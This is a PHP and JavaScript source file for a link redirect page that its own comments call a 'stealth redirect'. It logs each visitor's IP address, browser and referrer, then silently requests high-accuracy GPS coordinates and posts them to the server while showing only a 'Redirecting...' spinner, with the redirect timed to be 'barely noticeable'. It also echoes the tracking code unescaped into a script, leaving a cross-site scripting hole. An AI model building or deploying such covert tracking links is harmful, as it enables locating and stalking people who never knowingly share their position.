<?php
require_once('../config.php');
$db = connectDB();

// Get the tracking code from URL
$code = $_GET['code'] ?? '';

if (empty($code)) {
    die('Invalid tracking code');
}

// Get the original link from database
$stmt = $db->prepare("SELECT original_url FROM geo_links WHERE short_code = ?");
$stmt->execute([$code]);
$link = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$link) {
    die('Link not found');
}

$original_url = $link['original_url'];

// Save basic IP tracking data immediately
$tracking_data = [
    'code' => $code,
    'ip_address' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? '',
    'timestamp' => date('Y-m-d H:i:s')
];

// Insert basic tracking record
$stmt = $db->prepare("
    INSERT INTO geo_logs (link_id, ip_address, user_agent, referrer, timestamp, location_type) 
    SELECT id, ?, ?, ?, ?, 'IP' 
    FROM geo_links WHERE short_code = ?
");
$stmt->execute([
    $tracking_data['ip_address'],
    $tracking_data['user_agent'],
    $tracking_data['referrer'],
    $tracking_data['timestamp'],
    $code
]);

$log_id = $db->lastInsertId();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f8f9fa;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Redirecting to destination...</p>
    
    <script>
        // Store tracking data for background GPS capture
        const trackingCode = '<?= $code ?>';
        const logId = <?= $log_id ?>;
        const originalUrl = '<?= htmlspecialchars($original_url) ?>';
        
        console.log('Stealth redirect initiated');
        console.log('Tracking code:', trackingCode);
        console.log('Log ID:', logId);
        console.log('Destination:', originalUrl);
        
        // Attempt GPS capture in background (non-blocking)
        if (navigator.geolocation) {
            console.log('Attempting background GPS capture...');
            
            // Try high accuracy first
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log('GPS captured in background:', position);
                    
                    // Update the log with GPS data
                    const formData = new FormData();
                    formData.append('log_id', logId);
                    formData.append('latitude', position.coords.latitude);
                    formData.append('longitude', position.coords.longitude);
                    formData.append('accuracy', position.coords.accuracy);
                    formData.append('location_type', 'GPS');
                    
                    // Send GPS data to server (non-blocking)
                    fetch('update_gps_location.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            console.log('GPS data updated successfully');
                        }
                    })
                    .catch(error => {
                        console.error('Error updating GPS data:', error);
                    });
                },
                function(error) {
                    console.log('GPS capture failed:', error);
                    // Continue with redirect anyway
                },
                {
                    enableHighAccuracy: true,
                    timeout: 3000,  // Short timeout for quick redirect
                    maximumAge: 0
                }
            );
        }
        
        // Redirect after a very short delay (allows GPS attempt)
        setTimeout(() => {
            console.log('Redirecting to:', originalUrl);
            window.location.href = originalUrl;
        }, 100); // 100ms delay - barely noticeable
    </script>
</body>
</html> 